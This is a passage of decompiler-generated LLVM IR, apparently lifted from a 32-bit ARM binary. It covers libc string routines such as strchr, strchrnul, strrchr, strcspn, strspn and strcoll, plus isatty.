  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 5, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_17810, { 2, 0, 1 }
  uselistorder label %dec_label_pc_177a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17738, { 2, 0, 1 }
  uselistorder label %dec_label_pc_176d8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_17664, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_17628, { 1, 0 }
  uselistorder label %dec_label_pc_17614, { 1, 0 }
  uselistorder label %dec_label_pc_175d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17568, { 2, 0, 1 }
  uselistorder label %dec_label_pc_174fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1749c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1746c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_17408, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_173c8, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_17834.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_17834 = phi i32 [ %v0_17834.pre, %bb ], [ %v5_17834, %bb3 ]
  %v0_17830 = phi i32 [ %tmp, %bb ], [ %v5_17830, %bb3 ]
  %v1_17830 = inttoptr i32 %v0_17830 to i8*
  %v2_17830 = load i8, i8* %v1_17830, align 1
  %v1_17834 = inttoptr i32 %v0_17834 to i8*
  %v2_17834 = load i8, i8* %v1_17834, align 1
  %v3_17834 = zext i8 %v2_17834 to i32
  %v2_17838 = icmp eq i8 %v2_17830, 0
  br i1 %v2_17838, label %.dec_label_pc_17844_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_17834 = add i32 %v0_17834, 1
  %v5_17830 = add i32 %v0_17830, 1
  %v3_17830 = zext i8 %v2_17830 to i32
  %v10_1783c = icmp eq i8 %v2_17830, %v2_17834
  br i1 %v10_1783c, label %entry, label %dec_label_pc_17844

.dec_label_pc_17844_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_17844

dec_label_pc_17844:                               ; preds = %bb3, %.dec_label_pc_17844_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_17844_crit_edge ], [ %v3_17830, %bb3 ]
  %v2_17844.pre-phi = sub nsw i32 %.pn, %v3_17834
  ret i32 %v2_17844.pre-phi

; uselistorder directives
  uselistorder i8 %v2_17830, { 0, 2, 1 }
  uselistorder i32 %v0_17830, { 1, 0 }
  uselistorder i32 %v0_17834, { 1, 0 }
  uselistorder label %dec_label_pc_17844, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_178b4 = urem i32 %arg1, 256
  %v0_178d43 = load i32, i32* @r0, align 4
  %v1_178d44 = urem i32 %v0_178d43, 4
  %v2_178d45 = icmp eq i32 %v1_178d44, 0
  br i1 %v2_178d45, label %dec_label_pc_178dc, label %dec_label_pc_178bc

dec_label_pc_178bc:                               ; preds = %entry, %dec_label_pc_178d0
  %v0_178d0 = phi i32 [ %v1_178d0, %dec_label_pc_178d0 ], [ %v0_178d43, %entry ]
  %v1_178bc = inttoptr i32 %v0_178d0 to i8*
  %v2_178bc = load i8, i8* %v1_178bc, align 1
  %v3_178bc = zext i8 %v2_178bc to i32
  %v9_178c0 = icmp eq i32 %v3_178bc, %v1_178b4
  br i1 %v9_178c0, label %dec_label_pc_17990, label %dec_label_pc_178c8

dec_label_pc_178c8:                               ; preds = %dec_label_pc_178bc
  %v2_178c8 = icmp eq i8 %v2_178bc, 0
  br i1 %v2_178c8, label %dec_label_pc_1798c, label %dec_label_pc_178d0

dec_label_pc_178d0:                               ; preds = %dec_label_pc_178c8
  %v1_178d0 = add i32 %v0_178d0, 1
  %v1_178d4 = urem i32 %v1_178d0, 4
  %v2_178d4 = icmp eq i32 %v1_178d4, 0
  br i1 %v2_178d4, label %dec_label_pc_178dc, label %dec_label_pc_178bc

dec_label_pc_178dc:                               ; preds = %dec_label_pc_178d0, %entry
  %v0_178e0 = phi i32 [ %v0_178d43, %entry ], [ %v1_178d0, %dec_label_pc_178d0 ]
  %v4_178dc = mul nuw nsw i32 %v1_178b4, 256
  %v5_178dc = or i32 %v4_178dc, %v1_178b4
  %v4_178e4 = mul i32 %v5_178dc, 65536
  %v5_178e4 = or i32 %v4_178e4, %v5_178dc
  br label %dec_label_pc_178e8

dec_label_pc_178e8:                               ; preds = %dec_label_pc_17984, %dec_label_pc_17924, %dec_label_pc_178dc
  %v0_1794c = phi i32 [ %v0_178e0, %dec_label_pc_178dc ], [ %v4_178e8, %dec_label_pc_17924 ], [ %v4_178e8, %dec_label_pc_17984 ]
  %v1_178e8 = inttoptr i32 %v0_1794c to i32*
  %v2_178e8 = load i32, i32* %v1_178e8, align 4
  %v4_178e8 = add i32 %v0_1794c, 4
  %v2_178f0 = xor i32 %v2_178e8, %v5_178e4
  %v2_178fc = add i32 %v2_178e8, 2130640639
  %v1_17900 = sub i32 -1, %v2_178e8
  %v2_17904 = xor i32 %v2_178fc, %v1_17900
  %v2_17910 = and i32 %v2_17904, -2130640640
  store i32 %v2_17910, i32* @r1, align 4
  %v2_17918 = icmp eq i32 %v2_17910, 0
  br i1 %v2_17918, label %dec_label_pc_17924, label %dec_label_pc_1792c

dec_label_pc_17924:                               ; preds = %dec_label_pc_178e8
  %v2_178f4 = add i32 %v2_178f0, 2130640639
  %v1_1790c = sub i32 -1, %v2_178f0
  %v2_17914 = xor i32 %v2_178f4, %v1_1790c
  %v2_1791c = and i32 %v2_17914, -2130640640
  %v2_17924 = icmp eq i32 %v2_1791c, 0
  br i1 %v2_17924, label %dec_label_pc_178e8, label %dec_label_pc_1792c

dec_label_pc_1792c:                               ; preds = %dec_label_pc_178e8, %dec_label_pc_17924
  %v2_1792c = inttoptr i32 %v0_1794c to i8*
  %v3_1792c = load i8, i8* %v2_1792c, align 1
  %v4_1792c = zext i8 %v3_1792c to i32
  %v9_17930 = icmp eq i32 %v4_1792c, %v1_178b4
  br i1 %v9_17930, label %dec_label_pc_17990, label %dec_label_pc_1793c

dec_label_pc_1793c:                               ; preds = %dec_label_pc_1792c
  %v2_1793c = icmp eq i8 %v3_1792c, 0
  br i1 %v2_1793c, label %dec_label_pc_1798c, label %dec_label_pc_17944

dec_label_pc_17944:                               ; preds = %dec_label_pc_1793c
  %v1_17944 = add i32 %v0_1794c, 1
  %v2_17944 = inttoptr i32 %v1_17944 to i8*
  %v3_17944 = load i8, i8* %v2_17944, align 1
  %v4_17944 = zext i8 %v3_17944 to i32
  %v9_17948 = icmp eq i32 %v4_17944, %v1_178b4
  br i1 %v9_17948, label %dec_label_pc_17990, label %dec_label_pc_17954

dec_label_pc_17954:                               ; preds = %dec_label_pc_17944
  %v2_17954 = icmp eq i8 %v3_17944, 0
  br i1 %v2_17954, label %dec_label_pc_1798c, label %dec_label_pc_1795c

dec_label_pc_1795c:                               ; preds = %dec_label_pc_17954
  %v1_1795c = add i32 %v0_1794c, 2
  %v2_1795c = inttoptr i32 %v1_1795c to i8*
  %v3_1795c = load i8, i8* %v2_1795c, align 1
  %v4_1795c = zext i8 %v3_1795c to i32
  %v9_17960 = icmp eq i32 %v4_1795c, %v1_178b4
  br i1 %v9_17960, label %dec_label_pc_17990, label %dec_label_pc_1796c

dec_label_pc_1796c:                               ; preds = %dec_label_pc_1795c
  %v2_1796c = icmp eq i8 %v3_1795c, 0
  br i1 %v2_1796c, label %dec_label_pc_1798c, label %dec_label_pc_17974

dec_label_pc_17974:                               ; preds = %dec_label_pc_1796c
  %v1_17974 = add i32 %v0_1794c, 3
  %v2_17974 = inttoptr i32 %v1_17974 to i8*
  %v3_17974 = load i8, i8* %v2_17974, align 1
  %v4_17974 = zext i8 %v3_17974 to i32
  %v9_17978 = icmp eq i32 %v4_17974, %v1_178b4
  br i1 %v9_17978, label %dec_label_pc_17990, label %dec_label_pc_17984

dec_label_pc_17984:                               ; preds = %dec_label_pc_17974
  %v2_17984 = icmp eq i8 %v3_17974, 0
  br i1 %v2_17984, label %dec_label_pc_1798c, label %dec_label_pc_178e8

dec_label_pc_1798c:                               ; preds = %dec_label_pc_178c8, %dec_label_pc_17984, %dec_label_pc_1796c, %dec_label_pc_17954, %dec_label_pc_1793c
  br label %dec_label_pc_17990

dec_label_pc_17990:                               ; preds = %dec_label_pc_178bc, %dec_label_pc_17974, %dec_label_pc_1795c, %dec_label_pc_17944, %dec_label_pc_1792c, %dec_label_pc_1798c
  %v1_17994 = phi i32 [ 0, %dec_label_pc_1798c ], [ %v1_17974, %dec_label_pc_17974 ], [ %v1_1795c, %dec_label_pc_1795c ], [ %v1_17944, %dec_label_pc_17944 ], [ %v0_1794c, %dec_label_pc_1792c ], [ %v0_178d0, %dec_label_pc_178bc ]
  ret i32 %v1_17994

; uselistorder directives
  uselistorder i32 %v4_178e8, { 1, 0 }
  uselistorder i32 %v2_178e8, { 0, 2, 1 }
  uselistorder i32 %v0_1794c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_178dc, { 1, 0 }
  uselistorder i32 %v1_178d0, { 1, 0, 2 }
  uselistorder i32 %v0_178d43, { 2, 1, 0 }
  uselistorder i32 %v1_178b4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_17990, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1798c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1792c, { 1, 0 }
  uselistorder label %dec_label_pc_178bc, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_179a4 = urem i32 %arg1, 256
  %v0_179c42 = load i32, i32* @r0, align 4
  %v1_179c43 = urem i32 %v0_179c42, 4
  %v2_179c44 = icmp eq i32 %v1_179c43, 0
  br i1 %v2_179c44, label %dec_label_pc_179cc, label %dec_label_pc_179ac

dec_label_pc_179ac:                               ; preds = %entry, %dec_label_pc_179c0
  %v0_179c0 = phi i32 [ %v1_179c0, %dec_label_pc_179c0 ], [ %v0_179c42, %entry ]
  %v1_179ac = inttoptr i32 %v0_179c0 to i8*
  %v2_179ac = load i8, i8* %v1_179ac, align 1
  %v3_179ac = zext i8 %v2_179ac to i32
  %v9_179b0 = icmp eq i32 %v3_179ac, %v1_179a4
  br i1 %v9_179b0, label %dec_label_pc_17a7c, label %dec_label_pc_179b8

dec_label_pc_179b8:                               ; preds = %dec_label_pc_179ac
  %v2_179b8 = icmp eq i8 %v2_179ac, 0
  br i1 %v2_179b8, label %dec_label_pc_17a7c, label %dec_label_pc_179c0

dec_label_pc_179c0:                               ; preds = %dec_label_pc_179b8
  %v1_179c0 = add i32 %v0_179c0, 1
  %v1_179c4 = urem i32 %v1_179c0, 4
  %v2_179c4 = icmp eq i32 %v1_179c4, 0
  br i1 %v2_179c4, label %dec_label_pc_179cc, label %dec_label_pc_179ac

dec_label_pc_179cc:                               ; preds = %dec_label_pc_179c0, %entry
  %v0_179d0 = phi i32 [ %v0_179c42, %entry ], [ %v1_179c0, %dec_label_pc_179c0 ]
  %v4_179cc = mul nuw nsw i32 %v1_179a4, 256
  %v5_179cc = or i32 %v4_179cc, %v1_179a4
  %v4_179d4 = mul i32 %v5_179cc, 65536
  %v5_179d4 = or i32 %v4_179d4, %v5_179cc
  br label %dec_label_pc_179d8

dec_label_pc_179d8:                               ; preds = %dec_label_pc_17a74, %dec_label_pc_17a14, %dec_label_pc_179cc
  %v0_17a3c = phi i32 [ %v0_179d0, %dec_label_pc_179cc ], [ %v4_179d8, %dec_label_pc_17a14 ], [ %v4_179d8, %dec_label_pc_17a74 ]
  %v1_179d8 = inttoptr i32 %v0_17a3c to i32*
  %v2_179d8 = load i32, i32* %v1_179d8, align 4
  %v4_179d8 = add i32 %v0_17a3c, 4
  %v2_179e0 = xor i32 %v2_179d8, %v5_179d4
  %v2_179ec = add i32 %v2_179d8, 2130640639
  %v1_179f0 = sub i32 -1, %v2_179d8
  %v2_179f4 = xor i32 %v2_179ec, %v1_179f0
  %v2_17a00 = and i32 %v2_179f4, -2130640640
  store i32 %v2_17a00, i32* @r1, align 4
  %v2_17a08 = icmp eq i32 %v2_17a00, 0
  br i1 %v2_17a08, label %dec_label_pc_17a14, label %dec_label_pc_17a1c

dec_label_pc_17a14:                               ; preds = %dec_label_pc_179d8
  %v2_179e4 = add i32 %v2_179e0, 2130640639
  %v1_179fc = sub i32 -1, %v2_179e0
  %v2_17a04 = xor i32 %v2_179e4, %v1_179fc
  %v2_17a0c = and i32 %v2_17a04, -2130640640
  %v2_17a14 = icmp eq i32 %v2_17a0c, 0
  br i1 %v2_17a14, label %dec_label_pc_179d8, label %dec_label_pc_17a1c

dec_label_pc_17a1c:                               ; preds = %dec_label_pc_179d8, %dec_label_pc_17a14
  %v2_17a1c = inttoptr i32 %v0_17a3c to i8*
  %v3_17a1c = load i8, i8* %v2_17a1c, align 1
  %v4_17a1c = zext i8 %v3_17a1c to i32
  %v9_17a20 = icmp eq i32 %v4_17a1c, %v1_179a4
  br i1 %v9_17a20, label %dec_label_pc_17a7c, label %dec_label_pc_17a2c

dec_label_pc_17a2c:                               ; preds = %dec_label_pc_17a1c
  %v2_17a2c = icmp eq i8 %v3_17a1c, 0
  br i1 %v2_17a2c, label %dec_label_pc_17a7c, label %dec_label_pc_17a34

dec_label_pc_17a34:                               ; preds = %dec_label_pc_17a2c
  %v1_17a34 = add i32 %v0_17a3c, 1
  %v2_17a34 = inttoptr i32 %v1_17a34 to i8*
  %v3_17a34 = load i8, i8* %v2_17a34, align 1
  %v4_17a34 = zext i8 %v3_17a34 to i32
  %v9_17a38 = icmp eq i32 %v4_17a34, %v1_179a4
  br i1 %v9_17a38, label %dec_label_pc_17a7c, label %dec_label_pc_17a44

dec_label_pc_17a44:                               ; preds = %dec_label_pc_17a34
  %v2_17a44 = icmp eq i8 %v3_17a34, 0
  br i1 %v2_17a44, label %dec_label_pc_17a7c, label %dec_label_pc_17a4c

dec_label_pc_17a4c:                               ; preds = %dec_label_pc_17a44
  %v1_17a4c = add i32 %v0_17a3c, 2
  %v2_17a4c = inttoptr i32 %v1_17a4c to i8*
  %v3_17a4c = load i8, i8* %v2_17a4c, align 1
  %v4_17a4c = zext i8 %v3_17a4c to i32
  %v9_17a50 = icmp eq i32 %v4_17a4c, %v1_179a4
  br i1 %v9_17a50, label %dec_label_pc_17a7c, label %dec_label_pc_17a5c

dec_label_pc_17a5c:                               ; preds = %dec_label_pc_17a4c
  %v2_17a5c = icmp eq i8 %v3_17a4c, 0
  br i1 %v2_17a5c, label %dec_label_pc_17a7c, label %dec_label_pc_17a64

dec_label_pc_17a64:                               ; preds = %dec_label_pc_17a5c
  %v1_17a64 = add i32 %v0_17a3c, 3
  %v2_17a64 = inttoptr i32 %v1_17a64 to i8*
  %v3_17a64 = load i8, i8* %v2_17a64, align 1
  %v4_17a64 = zext i8 %v3_17a64 to i32
  %v9_17a68 = icmp eq i32 %v4_17a64, %v1_179a4
  br i1 %v9_17a68, label %dec_label_pc_17a7c, label %dec_label_pc_17a74

dec_label_pc_17a74:                               ; preds = %dec_label_pc_17a64
  %v2_17a74 = icmp eq i8 %v3_17a64, 0
  br i1 %v2_17a74, label %dec_label_pc_17a7c, label %dec_label_pc_179d8

dec_label_pc_17a7c:                               ; preds = %dec_label_pc_179b8, %dec_label_pc_179ac, %dec_label_pc_17a74, %dec_label_pc_17a64, %dec_label_pc_17a5c, %dec_label_pc_17a4c, %dec_label_pc_17a44, %dec_label_pc_17a34, %dec_label_pc_17a2c, %dec_label_pc_17a1c
  %v1_17a80 = phi i32 [ %v1_17a64, %dec_label_pc_17a74 ], [ %v1_17a64, %dec_label_pc_17a64 ], [ %v1_17a4c, %dec_label_pc_17a5c ], [ %v1_17a4c, %dec_label_pc_17a4c ], [ %v1_17a34, %dec_label_pc_17a44 ], [ %v1_17a34, %dec_label_pc_17a34 ], [ %v0_17a3c, %dec_label_pc_17a2c ], [ %v0_17a3c, %dec_label_pc_17a1c ], [ %v0_179c0, %dec_label_pc_179ac ], [ %v0_179c0, %dec_label_pc_179b8 ]
  ret i32 %v1_17a80

; uselistorder directives
  uselistorder i32 %v4_179d8, { 1, 0 }
  uselistorder i32 %v2_179d8, { 0, 2, 1 }
  uselistorder i32 %v0_17a3c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_179cc, { 1, 0 }
  uselistorder i32 %v1_179c0, { 1, 0, 2 }
  uselistorder i32 %v0_179c42, { 2, 1, 0 }
  uselistorder i32 %v1_179a4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_17a7c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_17a1c, { 1, 0 }
  uselistorder label %dec_label_pc_179ac, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_17a8c = load i32, i32* @r4, align 4
  store i32 %v3_17a8c, i32* %stack_var_-16, align 4
  %v6_17a8c = load i32, i32* @r5, align 4
  %v9_17a8c = load i32, i32* @r6, align 4
  %v0_17a90 = load i32, i32* @r0, align 4
  %v0_17a94 = load i32, i32* @r1, align 4
  store i32 %v0_17a94, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_17ab08 = inttoptr i32 %v0_17a90 to i8*
  %v2_17ab09 = load i8, i8* %v1_17ab08, align 1
  %v3_17ab010 = zext i8 %v2_17ab09 to i32
  store i32 %v3_17ab010, i32* @r1, align 4
  %v2_17ab411 = icmp eq i8 %v2_17ab09, 0
  store i32 %v0_17a94, i32* @r0, align 4
  %v1_17abc12 = add i32 %v0_17a90, 1
  store i32 %v1_17abc12, i32* @r4, align 4
  br i1 %v2_17ab411, label %dec_label_pc_17ac4, label %dec_label_pc_17aa0

dec_label_pc_17aa0:                               ; preds = %entry, %dec_label_pc_17aac
  %v3_17ab014 = phi i32 [ %v3_17ab0, %dec_label_pc_17aac ], [ %v3_17ab010, %entry ]
  %v0_17ab813 = phi i32 [ %v0_17ab8.pre, %dec_label_pc_17aac ], [ %v0_17a94, %entry ]
  %v2_17aa0 = call i32 @__GI_strchr(i32 %v0_17ab813, i32 %v3_17ab014)
  %v2_17aa4 = icmp eq i32 %v2_17aa0, 0
  %v0_17aac = load i32, i32* @r5, align 4
  br i1 %v2_17aa4, label %dec_label_pc_17aac, label %dec_label_pc_17ac4

dec_label_pc_17aac:                               ; preds = %dec_label_pc_17aa0
  %v1_17aac = add i32 %v0_17aac, 1
  %v0_17ab0.pre = load i32, i32* @r4, align 4
  %v0_17ab8.pre = load i32, i32* @r6, align 4
  store i32 %v1_17aac, i32* @r5, align 4
  %v1_17ab0 = inttoptr i32 %v0_17ab0.pre to i8*
  %v2_17ab0 = load i8, i8* %v1_17ab0, align 1
  %v3_17ab0 = zext i8 %v2_17ab0 to i32
  store i32 %v3_17ab0, i32* @r1, align 4
  %v2_17ab4 = icmp eq i8 %v2_17ab0, 0
  store i32 %v0_17ab8.pre, i32* @r0, align 4
  %v1_17abc = add i32 %v0_17ab0.pre, 1
  store i32 %v1_17abc, i32* @r4, align 4
  br i1 %v2_17ab4, label %dec_label_pc_17ac4, label %dec_label_pc_17aa0

dec_label_pc_17ac4:                               ; preds = %dec_label_pc_17aac, %dec_label_pc_17aa0, %entry
  %v0_17ac4 = phi i32 [ 0, %entry ], [ %v0_17aac, %dec_label_pc_17aa0 ], [ %v1_17aac, %dec_label_pc_17aac ]
  %v2_17ac8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17ac8, i32* @r4, align 4
  store i32 %v6_17a8c, i32* @r5, align 4
  store i32 %v9_17a8c, i32* @r6, align 4
  ret i32 %v0_17ac4

; uselistorder directives
  uselistorder i32 %v3_17ab0, { 1, 0 }
  uselistorder i32 %v0_17ab8.pre, { 1, 0 }
  uselistorder i32 %v0_17ab0.pre, { 1, 0 }
  uselistorder label %dec_label_pc_17aa0, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_17ad4 = urem i32 %arg2, 256
  store i32 %v1_17ad4, i32* @r4, align 4
  %v2_17ad4 = icmp eq i32 %v1_17ad4, 0
  br i1 %v2_17ad4, label %dec_label_pc_17ae8, label %dec_label_pc_17afc.preheader

dec_label_pc_17afc.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_17b043 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_17ad4)
  %v2_17b085 = icmp eq i32 %v2_17b043, 0
  br i1 %v2_17b085, label %dec_label_pc_17b10, label %dec_label_pc_17af4

dec_label_pc_17ae8:                               ; preds = %entry
  %v2_17aec = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_17b14

dec_label_pc_17af4:                               ; preds = %dec_label_pc_17afc.preheader, %dec_label_pc_17af4
  %v2_17b046 = phi i32 [ %v2_17b04, %dec_label_pc_17af4 ], [ %v2_17b043, %dec_label_pc_17afc.preheader ]
  store i32 %v2_17b046, i32* @r5, align 4
  %v1_17af8 = add i32 %v2_17b046, 1
  store i32 %v1_17af8, i32* @r0, align 4
  %v0_17b00 = load i32, i32* @r4, align 4
  %v2_17b04 = call i32 @__GI_strchr(i32 %v1_17af8, i32 %v0_17b00)
  %v2_17b08 = icmp eq i32 %v2_17b04, 0
  br i1 %v2_17b08, label %dec_label_pc_17b10, label %dec_label_pc_17af4

dec_label_pc_17b10:                               ; preds = %dec_label_pc_17af4, %dec_label_pc_17afc.preheader
  %v0_17b10 = load i32, i32* @r5, align 4
  br label %dec_label_pc_17b14

dec_label_pc_17b14:                               ; preds = %dec_label_pc_17ae8, %dec_label_pc_17b10
  %storemerge = phi i32 [ %v2_17aec, %dec_label_pc_17ae8 ], [ %v0_17b10, %dec_label_pc_17b10 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_17b04, { 1, 0 }
  uselistorder i32 %v1_17af8, { 1, 0 }
  uselistorder i32 %v1_17ad4, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17b14, { 1, 0 }
  uselistorder label %dec_label_pc_17af4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_17b502 = load i32, i32* @r0, align 4
  %v1_17b503 = inttoptr i32 %v0_17b502 to i8*
  %v2_17b504 = load i8, i8* %v1_17b503, align 1
  %v2_17b546 = icmp eq i8 %v2_17b504, 0
  br i1 %v2_17b546, label %dec_label_pc_17b60, label %dec_label_pc_17b34.preheader

dec_label_pc_17b2c:                               ; preds = %dec_label_pc_17b34
  %v1_17b3c = add i32 %v0_17b3c, 1
  %v9_17b2c = icmp eq i8 %v0_17b2c10.in, %v2_17b34
  br i1 %v9_17b2c, label %dec_label_pc_17b48, label %dec_label_pc_17b34

dec_label_pc_17b34:                               ; preds = %dec_label_pc_17b34.preheader, %dec_label_pc_17b2c
  %v0_17b3c = phi i32 [ %tmp, %dec_label_pc_17b34.preheader ], [ %v1_17b3c, %dec_label_pc_17b2c ]
  %v1_17b34 = inttoptr i32 %v0_17b3c to i8*
  %v2_17b34 = load i8, i8* %v1_17b34, align 1
  %v2_17b38 = icmp eq i8 %v2_17b34, 0
  br i1 %v2_17b38, label %dec_label_pc_17b60, label %dec_label_pc_17b2c

dec_label_pc_17b48:                               ; preds = %dec_label_pc_17b2c
  %v1_17b48 = add i32 %v0_17b48, 1
  %v1_17b4c = add i32 %v0_17b4c, 1
  %v1_17b50 = inttoptr i32 %v1_17b4c to i8*
  %v2_17b50 = load i8, i8* %v1_17b50, align 1
  %v2_17b54 = icmp eq i8 %v2_17b50, 0
  br i1 %v2_17b54, label %dec_label_pc_17b60, label %dec_label_pc_17b34.preheader

dec_label_pc_17b34.preheader:                     ; preds = %entry, %dec_label_pc_17b48
  %v0_17b4c = phi i32 [ %v1_17b4c, %dec_label_pc_17b48 ], [ %v0_17b502, %entry ]
  %v0_17b48 = phi i32 [ %v1_17b48, %dec_label_pc_17b48 ], [ 0, %entry ]
  %v0_17b2c10.in = phi i8 [ %v2_17b50, %dec_label_pc_17b48 ], [ %v2_17b504, %entry ]
  br label %dec_label_pc_17b34

dec_label_pc_17b60:                               ; preds = %dec_label_pc_17b48, %dec_label_pc_17b34, %entry
  %v0_17b60 = phi i32 [ 0, %entry ], [ %v0_17b48, %dec_label_pc_17b34 ], [ %v1_17b48, %dec_label_pc_17b48 ]
  ret i32 %v0_17b60

; uselistorder directives
  uselistorder i8 %v2_17b34, { 1, 0 }
  uselistorder i32 %v0_17b3c, { 1, 0 }
  uselistorder label %dec_label_pc_17b34.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_17b74 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_17b74, i32* @r1, align 4
  %v0_17b78 = call i32 @__GI_tcgetattr()
  %v1_17b7c = sub i32 1, %v0_17b78
  %v2_17b7c = icmp ult i32 %v0_17b78, 2
  br i1 %v2_17b7c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_17b8c = phi i32 [ %v1_17b7c, %entry ], [ 0, %bb ]
  ret i32 %v1_17b8c

; uselistorder directives
  uselistorder i32 %v0_17b78, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

